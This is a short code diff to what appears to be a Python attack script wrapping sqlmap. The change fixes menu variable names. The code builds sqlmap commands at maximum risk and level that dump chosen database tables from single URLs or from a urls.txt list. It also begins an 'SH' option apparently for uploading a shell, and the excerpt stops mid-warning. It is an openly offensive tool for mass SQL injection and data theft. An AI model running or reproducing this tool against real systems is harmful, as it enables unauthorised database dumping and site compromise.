@@ -87,7 +87,7 @@ if at == "SS" :
    table = input("table => ")
    os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 -D " + db + " -T" + table + " --dump")
 
-if option == "M" :
+if at == "M" :
     multi = open("urls.txt", "r")
     for url in multi:
         print(url+" starting...")
@@ -97,7 +97,7 @@ if option == "M" :
         table = input("table => ")
         os.system("sqlmap -u " + url + " --risk=3 --level=5 --random-agent --answers= y  --user-agent -v3 --batch --threads=10 -D " + db + " -T" + table + " --dump")
 
-if option == "SH" : 
+if at == "SH" : 
     url = input("url => ")
     print(Fore.RED+"""
     [!] YOU WILL ONLY BE AVAILABLE TO UPLOAD A 
